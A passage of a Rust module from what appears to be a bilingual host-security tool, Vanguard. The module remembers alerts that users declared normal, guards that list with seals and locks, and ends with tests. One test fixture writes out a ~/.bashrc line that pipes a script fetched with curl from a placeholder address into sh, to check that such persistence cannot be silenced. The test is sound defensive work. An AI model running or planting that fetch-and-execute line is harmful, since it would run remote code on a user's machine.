                let reste = changees.len().saturating_sub(3);
                if reste > 0 {
                    dit.push_str(&trf!(" et {reste} autre(s)", " and {reste} more"));
                }
                Some(dit)
            }
        }
    }
}

/// Ce qui est habituel ici, appris des mesures passées : la connexion (médiane des derniers tests).
fn habitudes() {
    section(tr!("VOS HABITUDES", "YOUR HABITS"));
    let Some(h) = crate::reseau::connexion::habitudes_ici() else {
        for ligne in envelopper(
            tr!(
                "Pas encore assez de tests de connexion (il en faut 3) pour connaître la normale.",
                "Not enough connection tests yet (3 are needed) to know what is normal."
            ),
            LARGEUR - 2,
        ) {
            println!("  {GRIS}{ligne}{RESET}");
        }
        return;
    };
    let debit = |d: Option<f64>| d.map_or_else(|| "?".to_string(), |d| format!("{d:.0}"));
    trp!(
        "  Connexion : ping {:.0} ms, ↓ {} Mbit/s, ↑ {} Mbit/s",
        "  Connection: ping {:.0} ms, ↓ {} Mbit/s, ↑ {} Mbit/s",
        h.ping_ms,
        debit(h.descendant),
        debit(h.montant)
    );
    trp!(
        "  {GRIS}médiane de vos {} derniers tests ; chaque nouveau test s'y compare{RESET}",
        "  {GRIS}median of your last {} tests; each new test is compared to it{RESET}",
        h.tests
    );
}

/// Menu Cette machine › Ce que Vanguard a appris : tes habitudes, tes choix, et les oublier.
pub fn menu() {
    titre(tr!("Ce que Vanguard a appris", "What Vanguard has learned"));
    habitudes();
    crate::protection::normales::section();
    section(tr!("VOS CHOIX", "YOUR CHOICES"));
    let appris = match charger() {
        Ok(a) => a,
        Err(Refus::Illisible) => {
            trp!(
                "  ✖ La liste de vos choix ne se lit plus : {}",
                "  ✖ Your choice list can no longer be read: {}",
                fichier().display()
            );
            return;
        }
        Err(Refus::Falsifiee(contenu)) => return reprendre(contenu),
    };
    let jour = aujourd_hui();
    // Acceptée telle quelle au premier usage des sceaux : toi seul sais si ce sont tes choix (COM-ETA-001 le dit
    // tant qu'elle n'est pas réécrite).
    let adoptee = crate::sceau::adopte(crate::sceau::APPRIS);
    if appris.acceptees.is_empty() {
        // Une liste vide ne tait rien : la resceller sans demander.
        if adoptee {
            let _ = sous_verrou(|lue| match lue {
                Ok(a) if a.acceptees.is_empty() && crate::sceau::adopte(crate::sceau::APPRIS) => Nouvelle::Ecrire(a),
                _ => Nouvelle::Inchangee,
            });
        }
        for ligne in envelopper(
            tr!(
                "Rien pour l'instant. Quand une alerte est normale chez vous, répondez « i » quand Vanguard propose de la corriger, ou dans la liste « À faire vous-même » : Vanguard s'en souviendra pendant 90 jours, et vous la montrera seulement pour info.",
                "Nothing yet. When an alert is normal for you, answer “i” when Vanguard offers to fix it, or in the “To do yourself” list: Vanguard will remember it for 90 days, and only show it for information."
            ),
            LARGEUR - 2,
        ) {
            println!("  {ligne}");
        }
        return;
    }
    trp!(
        "  Alertes que vous avez déclarées normales :\n",
        "  Alerts you declared normal:\n"
    );
    let liste: Vec<(String, Acceptee)> = appris.acceptees.clone().into_iter().collect();
    for (i, (_, a)) in liste.iter().enumerate() {
        let fin = date(&a.le).and_then(|le| le.checked_add_signed(chrono::Duration::days(DUREE_JOURS)));
        let etat = match fin {
            Some(f) if f > jour => trf!("jusqu'au {}", "until {}", affichee(f)),
            _ => tr!("expiré : la question reviendra", "expired: the question will come back").to_string(),
        };
        afficher_aligne(
            &format!("  {TOUCHE}{:>2}{RESET} ", i.saturating_add(1)),
            &format!("{} : {}", crate::langue::categorie(&a.categorie), a.message),
            5,
            "",
        );
        for l in &a.lignes {
            afficher_aligne("     • ", l, 7, GRIS);
        }
        println!("     {GRIS}{etat}{RESET}");
    }
    let reponse = demander(tr!(
        "\n  Oublier : numéro(s), « t » pour tout, Entrée pour garder : ",
        "\n  Forget: number(s), “a” for all, Enter to keep: "
    ));
    let mut a_oublier: Vec<usize> = if crate::langue::tout(&reponse) {
        (0..liste.len()).collect()
    } else {
        reponse
            .split([' ', ','])
            .filter_map(|n| n.trim().parse::<usize>().ok())
            .filter(|n| (1..=liste.len()).contains(n))
            .filter_map(|n| n.checked_sub(1))
            .collect()
    };
    // « 1 1 » ou « 1,1 » : un seul choix.
    a_oublier.sort_unstable();
    a_oublier.dedup();
    if a_oublier.is_empty() {
        if adoptee {
            garder_adoptee(&appris);
        }
        return;
    }
    // Retirés de la liste relue sous le verrou : un choix retenu entre-temps par un autre Vanguard reste.
    let ecrit = sous_verrou(|lue| match lue {
        Ok(mut a) => {
            for (signature, _) in a_oublier.iter().filter_map(|&i| liste.get(i)) {
                a.acceptees.remove(signature);
            }
            Nouvelle::Ecrire(a)
        }
        Err(_) => Nouvelle::Inchangee,
    });
    match ecrit {
        Ok(false) => trp!(
            "  ✖ La liste de vos choix a changé hors de ce menu : rien n'est oublié. Rouvrez-le.",
            "  ✖ Your choice list changed outside this menu: nothing is forgotten. Open it again."
        ),
        Ok(true) => {
            // Le relevé local ne garde que la règle de chaque choix oublié (la clé porte l'objet, parfois un chemin).
            for (_, a) in a_oublier.iter().filter_map(|&i| liste.get(i)) {
                if let Some((regle, _)) = a.cle.as_deref().and_then(|k| k.split_once('|')) {
                    crate::amelioration::noter_choix(regle, crate::amelioration::Choisi::Oubli);
                }
            }
            trp!(
                "  {VERT}✔{RESET} {} choix oublié(s) : ces alertes reviendront normalement.",
                "  {VERT}✔{RESET} {} choice(s) forgotten: these alerts will come back as usual.",
                a_oublier.len()
            );
        }
        Err(e) => trp!("  ✖ Impossible d'enregistrer ({e}).", "  ✖ Could not save ({e})."),
    }
}

/// La liste acceptée telle quelle au premier usage des sceaux (le jour où Vanguard est passé à une version qui
/// scelle, ou `sceaux.json` effacé par un autre programme) : appliquée, mais seulement rescellée sur ton accord.
fn garder_adoptee(appris: &Appris) {
    let appris = &sans_etats(appris.clone());
    trp!(
        "\n  Cette liste a été acceptée telle quelle, sans sceau d'avant (mise à\n  jour de Vanguard, ou sceaux effacés par un autre programme).",
        "\n  This list was accepted as it was, without an earlier seal (Vanguard\n  update, or seals deleted by another program)."
    );
    if !demander(tr!(
        "  Ce sont bien vos choix : les garder ? [o/N] : ",
        "  These are really your choices: keep them? [y/N]: "
    ))
    .oui()
    {
        return;
    }
    // Écrite seulement si la liste est encore celle qui vient d'être montrée et acceptée.
    let ecrit = sous_verrou(|lue| match lue {
        Ok(mut a) if crate::sceau::adopte(crate::sceau::APPRIS) => {
            retirer_etats(&mut a);
            if meme_liste(&a, appris) {
                Nouvelle::Ecrire(a)
            } else {
                Nouvelle::Inchangee
            }
        }
        _ => Nouvelle::Inchangee,
    });
    dire_l_ecriture(ecrit);
}

/// Ce qu'une écriture demandée dans le menu a donné, à l'écran.
fn dire_l_ecriture(ecrit: std::io::Result<bool>) {
    match ecrit {
        Ok(true) => trp!("  {VERT}✔{RESET} C'est noté.", "  {VERT}✔{RESET} Noted."),
        Ok(false) => trp!(
            "  ✖ La liste de vos choix a changé pendant cette question : rien n'est écrit. Rouvrez le menu.",
            "  ✖ Your choice list changed during this question: nothing is written. Open the menu again."
        ),
        Err(e) => trp!("  ✖ Impossible d'enregistrer ({e}).", "  ✖ Could not save ({e})."),
    }
}

/// Une liste reprise sans son sceau (changée hors de Vanguard, ou adoptée) : chaque choix perd l'état exact qu'il
/// liait, ses lignes et leurs traces, que l'écran ne montre pas et qu'un programme aurait pu forger pour coller à sa
/// propre ligne. Une alerte à corriger soi-même revient alors une fois, et se redéclare depuis ce que Vanguard montre.
/// `true` si un choix en liait un.
fn retirer_etats(appris: &mut Appris) -> bool {
    let mut retires = false;
    for a in appris.acceptees.values_mut() {
        retires |= a.etat.is_some();
        a.etat = None;
        a.lignes.clear();
        a.traces.clear();
    }
    retires
}

/// `retirer_etats`, dit à l'écran.
fn sans_etats(mut appris: Appris) -> Appris {
    if retirer_etats(&mut appris) {
        afficher_aligne(
            "  ",
            tr!(
                "Les fichiers que liaient ces choix ne se vérifient pas sans sceau : gardés, ils ne valent plus que pour les corrections automatiques ; une alerte à corriger vous-même reviendra une fois, à redéclarer.",
                "The files these choices were bound to cannot be checked without a seal: kept, they only apply to automatic fixes; an alert to fix yourself will come back once, to declare again."
            ),
            2,
            GRIS,
        );
    }
    appris
}

/// La liste changée hors de Vanguard : montrée telle qu'elle est maintenant, sans être appliquée. Toi seul sais si ces
/// choix sont les tiens (une copie de Vanguard plus ancienne écrit aussi sans sceau) : les garder les rescelle, sinon
/// ils sont oubliés, et leurs alertes reviennent.
fn reprendre(contenu: Option<Appris>) {
    trp!(
        "  ✖ La liste de vos choix a été changée hors de Vanguard :\n    aucun n'est appliqué.",
        "  ✖ Your choice list was changed outside Vanguard:\n    none is applied."
    );
    let appris = sans_etats(contenu.unwrap_or_default());
    // Écrite hors de Vanguard : chaque mot est montré rendu inoffensif.
    for a in appris.acceptees.values() {
        afficher_aligne(
            "    ",
            &crate::ui::affichable(&format!("{} : {}", crate::langue::categorie(&a.categorie), a.message)),
            4,
            "",
        );
    }
    let garder = !appris.acceptees.is_empty()
        && demander(tr!(
            "\n  Ce sont bien vos choix : les garder ? [o/N] : ",
            "\n  These are really your choices: keep them? [y/N]: "
        ))
        .oui();
    let oublier = !garder
        && demander(tr!(
            "  Tout oublier (leurs alertes reviendront) ? [o/N] : ",
            "  Forget everything (their alerts will come back)? [y/N]: "
        ))
        .oui();
    if !garder && !oublier {
        return;
    }
    // Sous le verrou, la liste doit être encore celle qui vient d'être montrée : garder ou oublier une autre liste
    // (réécrite pendant la question) serait un choix que la personne n'a pas vu.
    let ecrit = sous_verrou(|lue| {
        let Err(Refus::Falsifiee(contenu)) = lue else {
            return Nouvelle::Inchangee;
        };
        let mut maintenant = contenu.unwrap_or_default();
        retirer_etats(&mut maintenant);
        if !meme_liste(&maintenant, &appris) {
            Nouvelle::Inchangee
        } else if garder {
            Nouvelle::Ecrire(maintenant)
        } else {
            Nouvelle::Effacer
        }
    });
    dire_l_ecriture(ecrit);
}

#[allow(
    clippy::arithmetic_side_effects,
    clippy::as_conversions,
    reason = "essais : y déborder fait échouer l'essai"
)]
#[cfg(test)]
mod tests {
    use super::*;

    fn constat(categorie: &'static str, niveau: Niveau, message: &str) -> Constat {
        Constat {
            categorie,
            probleme: Some(niveau),
            message: message.into(),
            correctif: Some(crate::machine::Correctif {
                action: "corriger".into(),
                commandes: vec!["sudo x".into()],
                automatique: true,
                bloque: None,
                droits: crate::machine::Droits::Admin,
                defaire: crate::machine::Defaire::Inconnu,
                temoins: crate::machine::temoins::Temoins::Aucun,
            }),
            verifie: true,
            regle: "",
            objet: crate::modele::Objet::NonMigre,
            precision: crate::modele::Precision::Aucune,
        }
    }

    fn appris(categorie: &str, message: &str, niveau: Niveau, le: &str) -> Appris {
        let mut a = Appris::default();
        a.acceptees.insert(
            signature(categorie, message),
            Acceptee {
                categorie: categorie.into(),
                message: message.into(),
                niveau,
                le: le.into(),
                cle: None,
                etat: None,
                lignes: Vec::new(),
                traces: Vec::new(),
            },
        );
        a
    }

    fn jour(t: &str) -> NaiveDate {
        date(t).unwrap()
    }

    /// Vérification de la campagne E, N8 : la liste ne s'écrit (ni ne s'efface) que par `sous_verrou`, qui la relit
    /// sous le verrou. Un nouvel écrivain qui l'écrirait de son côté pourrait écraser un choix fait à côté.
    #[test]
    fn une_seule_porte_d_ecriture() {
        let source = include_str!("apprentissage.rs");
        let code = source.split("#[cfg(test)]\nmod tests").next().unwrap();
        assert_eq!(
            code.matches("enregistrer(").count(),
            2,
            "sa définition et `sous_verrou`"
        );
        assert_eq!(code.matches("sceau::effacer(").count(), 1, "`sous_verrou` seul");
        assert_eq!(code.matches("Verrou::prendre(").count(), 1, "`sous_verrou` seul");
        assert_eq!(code.matches("sceau::ecrire(").count(), 1, "dans `enregistrer`");
    }

    #[test]
    fn choix_applique_puis_expire() {
        let a = appris("Groupes", "Tu es dans le groupe docker.", Niveau::Moyen, "2026-10-18");
        let mut c = [constat("Groupes", Niveau::Moyen, "Tu es dans le groupe docker.")];
        assert_eq!(appliquer_le(&a, &mut c, jour("2026-11-01")), 1);
        assert_eq!(c[0].probleme, Some(Niveau::Info));
        assert!(c[0].correctif.is_none());
        // 90 jours plus tard, la question revient.
        let mut c = [constat("Groupes", Niveau::Moyen, "Tu es dans le groupe docker.")];
        assert_eq!(appliquer_le(&a, &mut c, jour("2027-01-16")), 0);
        assert_eq!(c[0].probleme, Some(Niveau::Moyen));
    }

    /// Une ligne ajoutée à appris.json par un autre programme ne fait taire aucune alerte : la liste changée hors de
    /// Vanguard ne compte plus du tout, ni pour l'ajout ni pour les choix d'avant.
    #[test]
    fn liste_changee_a_cote_jamais_appliquee() {
        let message = "Tu es dans le groupe docker.";
        let mut a = appris(
            "Groupes",
            message,
            Niveau::Moyen,
            &aujourd_hui().format("%Y-%m-%d").to_string(),
        );
        enregistrer(&a).unwrap();
        let mut c = [constat("Groupes", Niveau::Moyen, message)];
        assert_eq!(appliquer(&mut c), 1);
        let ajout = a.acceptees.values().next().unwrap().clone();
        a.acceptees.insert(
            "Persistance : x".into(),
            Acceptee {
                categorie: "Persistance".into(),
                ..ajout
            },
        );
        std::fs::write(fichier(), serde_json::to_string(&a).unwrap()).unwrap();
        let mut c = [constat("Groupes", Niveau::Moyen, message)];
        assert_eq!(appliquer(&mut c), 0);
        assert_eq!(c[0].probleme, Some(Niveau::Moyen));
        assert!(matches!(charger(), Err(Refus::Falsifiee(Some(l))) if l.acceptees.len() == 2));
        assert_eq!(nombre(), None);
        crate::sceau::effacer(crate::sceau::APPRIS).unwrap();
    }

    /// L'ancienne alerte du noyau, groupée et acceptée, tait chacune des trois nouvelles ; un réglage qu'elle ne
    /// citait pas fait revenir la sienne.
    #[test]
    fn ancien_choix_du_noyau_groupe() {
        let ancien = "Réglages faibles : kernel.randomize_va_space = 1 (adresses au hasard), \
                      fs.protected_symlinks = 0 (liens de /tmp), net.ipv4.tcp_syncookies = 0 (SYN).";
        let a = appris("Noyau durci", ancien, Niveau::Moyen, "2026-10-18");
        let mut c = [
            constat(
                "Noyau durci",
                Niveau::Moyen,
                "Réglages faibles : kernel.randomize_va_space = 1 (adresses au hasard).",
            ),
            constat(
                "Noyau durci",
                Niveau::Info,
                "Réglages faibles : fs.protected_symlinks = 0 (liens de /tmp).",
            ),
            constat(
                "Noyau durci",
                Niveau::Info,
                "Réglages faibles : net.ipv4.tcp_syncookies = 0 (SYN).",
            ),
        ];
        assert_eq!(appliquer_le(&a, &mut c, jour("2026-10-23")), 3);
        let mut c = [constat(
            "Noyau durci",
            Niveau::Info,
            "Réglages faibles : net.ipv4.tcp_syncookies = 0 (SYN), net.ipv4.conf.all.rp_filter = 0 (origine).",
        )];
        assert_eq!(appliquer_le(&a, &mut c, jour("2026-10-23")), 0);
        // Ailleurs que dans le noyau, rien de tel.
        let mut c = [constat(
            "Groupes",
            Niveau::Info,
            "Réglages faibles : fs.protected_symlinks = 0 (liens de /tmp).",
        )];
        assert_eq!(appliquer_le(&a, &mut c, jour("2026-10-23")), 0);
    }

    #[test]
    fn adresses_gardees_dans_la_signature() {
        // Une quantité change, la même alerte ; une autre adresse, une autre alerte.
        assert_eq!(
            signature("Santé", "Disque : 12 % libres sur 512 Go."),
            signature("Santé", "Disque : 9 % libres sur 1000 Go.")
        );
        assert_ne!(
            signature("DNS", "DNS réglé à la main vers un serveur inconnu : 10.0.0.5."),
            signature("DNS", "DNS réglé à la main vers un serveur inconnu : 185.1.2.3.")
        );
        assert_eq!(
            signature("DNS", "Vers 10.0.0.5, 3 fois."),
            "DNS : Vers 10.0.0.5, # fois."
        );
    }

    // Un chiffre collé à des lettres fait partie d'un nom (programme, compte, SID) : accepter « maj2.desktop » ne doit
    // pas faire taire un « maj3.desktop » posé plus tard, ni un autre compte. Les quantités, elles, restent effacées.
    #[test]
    fn noms_avec_chiffres_distincts() {
        assert_ne!(
            signature("Persistance", "Lancement suspect : ~/.config/autostart/maj2.desktop"),
            signature("Persistance", "Lancement suspect : ~/.config/autostart/maj3.desktop")
        );
        assert_ne!(
            signature("Comptes", "Compte administrateur inconnu : S-1-5-21-111-222-333-1001."),
            signature("Comptes", "Compte administrateur inconnu : S-1-5-21-111-222-333-1002.")
        );
        assert_eq!(signature("Santé", "x86_64, id_ed25519"), "Santé : x86_64, id_ed25519");
        assert_eq!(
            signature("Santé", "Disque : 12 % libres (512 Go), signal -60 dBm, 3 fois."),
            "Santé : Disque : # % libres (# Go), signal -# dBm, # fois."
        );
    }

    #[test]
    fn aggravation_et_nombres() {
        let a = appris("Santé", "Disque : 12 % libres.", Niveau::Moyen, "2026-10-18");
        // Mêmes mots, autres nombres : la même alerte.
        let mut c = [constat("Santé", Niveau::Moyen, "Disque : 9 % libres.")];
        assert_eq!(appliquer_le(&a, &mut c, jour("2026-10-20")), 1);
        // Plus grave qu'au moment du choix : elle revient.
        let mut c = [constat("Santé", Niveau::Eleve, "Disque : 2 % libres.")];
        assert_eq!(appliquer_le(&a, &mut c, jour("2026-10-20")), 0);
        // Un port, c'est un numéro précis : un autre port est une autre alerte.
        let a = appris("Ports en écoute", "8080/tcp ouvert.", Niveau::Moyen, "2026-10-18");
        let mut c = [constat("Ports en écoute", Niveau::Moyen, "8081/tcp ouvert.")];
        assert_eq!(appliquer_le(&a, &mut c, jour("2026-10-20")), 0);
    }

    /// Une alerte des ports avec sa clé, dans une langue ou l'autre.
    fn port(message: &str, programme: &str) -> Constat {
        let mut c = constat("Ports en écoute", Niveau::Moyen, message).avec_objet(crate::modele::Objet::port(
            8080,
            "tcp",
            Some(programme),
        ));
        c.regle = "LNX-RES-001";
        c
    }

    const FR: &str = "8080/tcp (HTTP) ouvert sur le réseau par « python3 ». Un service web de développement.";

    /// Vérification de Fable, A1 : un choix sans clé retrouvé par son texte n'est rattaché à une clé que si un seul
    /// constat de la passe y répond. Deux clés au même message (un nom suivi d'un invisible, rendu pareil par
    /// `affichable`) : le choix reste sans clé, les deux le disent ; une seule : la clé est complétée.
    #[test]
    fn un_choix_sans_cle_ne_migre_pas_vers_un_sosie() {
        let message = "Clé privée ~/.ssh/id_x lisible par d'autres.";
        let a = appris("Clés SSH", message, Niveau::Critique, "2026-10-18");
        let cle = |nom: &str| {
            let mut c =
                constat("Clés SSH", Niveau::Critique, message).avec_objet(crate::modele::Objet::de("chemin", nom));
            c.regle = "LNX-SSH-003";
            c
        };
        let jour = jour("2026-10-20");
        let mut cles = Vec::new();
        let mut deux = [cle("~/.ssh/id_x"), cle("~/.ssh/id_x\\u{200b}")];
        assert_eq!(
            appliquer_avec(&a, &mut deux, jour, &mut cles),
            2,
            "tus tous deux, comme avant les clés"
        );
        assert!(cles.is_empty(), "aucune clé complétée : {cles:?}");
        assert!(
            deux.iter()
                .all(|c| c.message.contains("vaut pour 2 alertes au même texte"))
        );
        // La même clé deux fois (deux lectures du même fichier) n'est pas une ambiguïté.
        let mut cles = Vec::new();
        let mut memes = [cle("~/.ssh/id_x"), cle("~/.ssh/id_x")];
        assert_eq!(appliquer_avec(&a, &mut memes, jour, &mut cles), 2);
        let attendue = cle("~/.ssh/id_x").cle().unwrap().to_string();
        assert_eq!(cles, vec![(signature("Clés SSH", message), attendue)]);
        // Seule : complétée, et dite au journal par `appliquer` (`noter_completion`).
        let mut cles = Vec::new();
        let mut seule = [cle("~/.ssh/id_x")];
        assert_eq!(appliquer_avec(&a, &mut seule, jour, &mut cles), 1);
        assert_eq!(cles.len(), 1);
        assert!(!seule[0].message.contains("alertes au même texte"));
    }

    /// La liste de la 0.85 (sans clés) se relit ; un choix y est retrouvé par son texte, puis complété de la clé de
    /// son alerte : il vaut ensuite dans l'autre langue.
    #[test]
    fn choix_de_la_085_retrouves_puis_completes() {
        let mut a: Appris = serde_json::from_str(include_str!("../tests/donnees/appris-0.85.json")).unwrap();
        assert_eq!(a.acceptees.len(), 2);
        assert!(a.acceptees.values().all(|c| c.cle.is_none()));
        let jour = jour("2026-10-23");
        let mut cles = Vec::new();
        let mut c = [port(FR, "python3")];
        assert_eq!(appliquer_avec(&a, &mut c, jour, &mut cles), 1);
        assert_eq!(cles.len(), 1);
        assert_eq!(
            completer(&mut a, cles),
            vec![(
                "Ports en écoute".to_string(),
                "LNX-RES-001|port:8080/tcp:python3".to_string()
            )]
        );
        assert!(completer(&mut a, vec![]).is_empty(), "rien à réécrire");
        let ecrit = serde_json::to_string(&a).unwrap();
        assert!(ecrit.contains("\"cle\":\"LNX-RES-001|port:8080/tcp:python3\""));
        // Dans l'autre langue, même clé : toujours accepté, sans rien de plus à compléter.
        let mut cles = Vec::new();
        let mut en = [port(
            "8080/tcp (HTTP) open to the network by “python3”. A development web server.",
            "python3",
        )];
        assert_eq!(appliquer_avec(&a, &mut en, jour, &mut cles), 1);
        assert_eq!(cles, Vec::<(String, String)>::new());
        assert_eq!(en[0].probleme, Some(Niveau::Info));
        // Le choix sans clé d'une règle pas encore migrée vaut toujours par son texte.
        let mut g = [constat("Groupes", Niveau::Moyen, "Tu es dans le groupe docker.")];
        assert_eq!(appliquer_le(&a, &mut g, jour), 1);
    }

    /// Un choix à clé ne vaut que pour son objet : même texte, autre programme sur le port, l'alerte reste.
    #[test]
    fn un_choix_a_cle_ne_tait_que_son_objet() {
        let mut a = appris("Ports en écoute", FR, Niveau::Moyen, "2026-10-22");
        for c in a.acceptees.values_mut() {
            c.cle = Some("LNX-RES-001|port:8080/tcp:python3".into());
        }
        let mut autre = [port(FR, "intrus")];
        assert_eq!(appliquer_le(&a, &mut autre, jour("2026-10-23")), 0);
        assert_eq!(autre[0].probleme, Some(Niveau::Moyen));
        // Plus grave qu'au moment du choix : il revient, clé ou pas.
        let mut pire = [port(FR, "python3")];
        pire[0].probleme = Some(Niveau::Eleve);
        assert_eq!(appliquer_le(&a, &mut pire, jour("2026-10-23")), 0);
    }

    /// Accepté en anglais, périmé, puis accepté de nouveau en français : un seul choix reste pour la clé, et il vaut
    /// (avant, l'ancien choix anglais, rangé le premier, masquait celui du jour).
    #[test]
    fn un_seul_choix_par_cle() {
        let en = "8080/tcp (HTTP) open to the network by “python3”. A development web server.";
        let mut a = Appris::default();
        retenir(&mut a, &port(en, "python3"), Niveau::Moyen, jour("2026-07-01"));
        let mut c = [port(FR, "python3")];
        assert_eq!(appliquer_le(&a, &mut c, jour("2026-09-30")), 0, "périmé au 91e jour");
        retenir(&mut a, &port(FR, "python3"), Niveau::Moyen, jour("2026-09-30"));
        assert_eq!(a.acceptees.len(), 1);
        for message in [FR, en] {
            let mut c = [port(message, "python3")];
            assert_eq!(appliquer_le(&a, &mut c, jour("2026-09-30")), 1, "{message}");
        }
        // Une liste déjà en double (écrite avant) : le choix le plus récent l'emporte, dans un ordre ou l'autre.
        for (vieux, recent) in [(en, FR), (FR, en)] {
            let mut double = Appris::default();
            retenir(&mut double, &port(vieux, "python3"), Niveau::Moyen, jour("2026-07-01"));
            let mut b = Appris::default();
            retenir(&mut b, &port(recent, "python3"), Niveau::Moyen, jour("2026-09-30"));
            double.acceptees.extend(b.acceptees);
            assert_eq!(double.acceptees.len(), 2);
            let mut c = [port(FR, "python3")];
            assert_eq!(appliquer_le(&double, &mut c, jour("2026-09-30")), 1);
        }
    }

    /// Campagne E, M-a : une ligne ajoutée change l'alerte (son texte, sa clé) : aucun choix ne la tait, et elle dit
    /// laquelle est nouvelle depuis le choix d'avant.
    #[test]
    fn ligne_ajoutee_dite() {
        use crate::machine::temoins::{Temoins, temoin};
        let manuelle = |message: &str, lignes: &[&str]| {
            let mut c = constat("Programmes au démarrage", Niveau::Eleve, message);
            let k = c.correctif.as_mut().unwrap();
            k.automatique = false;
            k.temoins = Temoins::de(
                lignes
                    .iter()
                    .enumerate()
                    .map(|(i, l)| {
                        Ok(temoin(
                            &format!("~/a.service:{i}"),
                            format!("~/a.service:{i}"),
                            l,
                            None,
                            &[],
                        ))
                    })
                    .collect(),
            );
            c
        };
        let j = jour("2026-11-10");
        let mut a = Appris::default();
        retenir(
            &mut a,
            &manuelle("Lancé au démarrage : rappel.", &["ExecStart=/opt/rappel"]),
            Niveau::Eleve,
            j,
        );
        let mut plus = [manuelle(
            "Lancé au démarrage : rappel ; autre.",
            &["ExecStart=/opt/rappel", "ExecStartPost=/opt/autre"],
        )];
        assert_eq!(appliquer_le(&a, &mut plus, j), 0);
        assert_eq!(plus[0].probleme, Some(Niveau::Eleve));
        assert!(
            plus[0]
                .message
                .contains("(revenue : ~/a.service:1 ligne nouvelle ou changée, depuis votre choix du"),
            "{}",
            plus[0].message
        );
    }

    /// Une alerte à corriger soi-même : déclarable seulement si sa règle relève ce que le choix lierait ; tue pour
    /// cet état exact ; jamais par un ancien choix sans état (même clé, même texte), ni quand le relevé est refusé.
    #[test]
    fn alerte_manuelle_liee_a_son_etat() {
        use crate::machine::temoins::{Temoins, temoin};
        let manuelle = |t: Temoins| {
            let mut c = constat("Programmes au démarrage", Niveau::Eleve, "Lancé au démarrage : rappel.");
            let k = c.correctif.as_mut().unwrap();
            k.automatique = false;
            k.temoins = t;
            c
        };
        let releves = |ligne: &str| {
            Temoins::de(vec![Ok(temoin(
                "~/.config/systemd/user/rappel.service:6",
                "~/.config/systemd/user/rappel.service:6".into(),
                ligne,
                None,
                &[],
            ))])
        };
        assert!(
            declarable(&manuelle(Temoins::Aucun)).is_err(),
            "règle sans relevé : à la main seulement"
        );
        assert!(declarable(&manuelle(Temoins::Refuse("ambiguë".into()))).is_err());
        let vue = manuelle(releves("ExecStart=%h/.cache-x/rappel.sh"));
        assert!(declarable(&vue).is_ok());
        let j = jour("2026-11-10");
        let mut a = Appris::default();
        retenir(&mut a, &vue, Niveau::Eleve, j);
        assert_eq!(appliquer_le(&a, &mut [vue.clone()], j), 1);
        let mut autre = [manuelle(releves("ExecStart=%h/.cache-x/autre.sh"))];
        assert_eq!(appliquer_le(&a, &mut autre, j), 0);
        assert_eq!(autre[0].probleme, Some(Niveau::Eleve));
        assert_eq!(
            appliquer_le(&a, &mut [manuelle(Temoins::Refuse("illisible".into()))], j),
            0
        );
        // Un choix sans état (écrit avant ce lot, ou à la main) ne tait pas une alerte à témoins.
        let mut ancien = appris(
            "Programmes au démarrage",
            "Lancé au démarrage : rappel.",
            Niveau::Eleve,
            "2026-11-10",
        );
        assert_eq!(appliquer_le(&ancien, &mut [vue.clone()], j), 0);
        for c in ancien.acceptees.values_mut() {
            c.etat = Some("0".repeat(64));
        }
        assert_eq!(appliquer_le(&ancien, &mut [vue.clone()], j), 0);

        // C8 : revenue, elle dit pourquoi, et quelle ligne a changé.
        assert!(autre[0].message.contains("revenue"), "{}", autre[0].message);
        assert!(
            autre[0].message.contains("rappel.service:6 ligne nouvelle ou changée"),
            "{}",
            autre[0].message
        );
        assert_eq!(sans_revenue(&autre[0].message), "Lancé au démarrage : rappel.");
        let mut sans_etat = [vue.clone()];
        let ancien = appris(
            "Programmes au démarrage",
            "Lancé au démarrage : rappel.",
            Niveau::Eleve,
            "2026-11-10",
        );
        appliquer_le(&ancien, &mut sans_etat, j);
        assert!(sans_etat[0].message.contains("état exact"), "{}", sans_etat[0].message);

        // M1 : un choix daté du futur (horloge fausse) ne vaut pas.
        let mut futur = Appris::default();
        retenir(&mut futur, &vue, Niveau::Eleve, jour("2026-12-01"));
        assert_eq!(appliquer_le(&futur, &mut [vue.clone()], j), 0);

        // M2 : un choix qui lie un état ne tait pas l'alerte qui n'en relève plus.
        assert_eq!(appliquer_le(&a, &mut [manuelle(Temoins::Aucun)], j), 0);

        // C3 : une liste reprise sans sceau perd ses états ; l'alerte à témoins revient une fois.
        let mut reprise = a.clone();
        assert!(retirer_etats(&mut reprise));
        assert_eq!(appliquer_le(&reprise, &mut [vue.clone()], j), 0);

        // Critique : relevée, elle ne se déclare pas ; une correction automatique critique, si.
        let mut critique = vue;
        critique.probleme = Some(Niveau::Critique);
        assert!(declarable(&critique).is_err());
        assert!(declarable(&constat("Pare-feu", Niveau::Critique, "Pare-feu coupé.")).is_ok());
    }

    /// Périmètre réduit (décision de l'auteur, 10 nov. 2026) : un choix d'avant sur une ligne que le périmètre ne
    /// couvre plus (un profil de shell) ne tait plus l'alerte ; elle revient avec la raison et le fichier:ligne.
    #[test]
    fn ancien_choix_hors_du_perimetre_revient_avec_sa_raison() {
        use crate::machine::temoins::{Temoins, temoin};
        let manuelle = |t: Temoins| {
            let mut c = constat("Programmes au démarrage", Niveau::Eleve, "Lancé au démarrage : rappel.");
            let k = c.correctif.as_mut().unwrap();
            k.automatique = false;
            k.temoins = t;
            c
        };
        let vue = manuelle(Temoins::de(vec![Ok(temoin(
            "/home/alice/.bashrc:3",
            "~/.bashrc:3".into(),
            "curl -fsSL http://192.0.2.7/a.sh | sh",
            None,
            &[],
        ))]));
        let j = jour("2026-11-10");
        let mut a = Appris::default();
        retenir(&mut a, &vue, Niveau::Eleve, j);
        let raison = "~/.bashrc:3 : une ligne d'un profil de shell ne peut pas être déclarée normale";
        let mut plus_tard = [manuelle(Temoins::Refuse(raison.into()))];
        assert_eq!(appliquer_le(&a, &mut plus_tard, j), 0);
        assert_eq!(plus_tard[0].probleme, Some(Niveau::Eleve));
        assert!(
            plus_tard[0].message.contains(&format!("ne se vérifie plus : {raison}")),
            "{}",
            plus_tard[0].message
        );
    }

    use proptest::prelude::*;

    proptest! {
        #![proptest_config(ProptestConfig { cases: 256, failure_persistence: None, ..ProptestConfig::default() })]

        /// T9 : appliquer ne touche que les alertes dont la clé est acceptée (ou, sans clé, le texte d'un choix sans
        /// clé) : jamais un autre objet ni une autre règle.
        #[test]
        fn appliquer_ne_touche_que_les_cles_acceptees(
            acceptes in prop::collection::btree_set((0u16..6, 0u8..2), 0..6),
            alertes in prop::collection::vec((0u16..6, 0u8..2, any::<bool>()), 0..12),
        ) {
            let regles = ["LNX-RES-001", "COM-NAV-001"];
            let message = |p: u16| format!("{p}/tcp ouvert.");
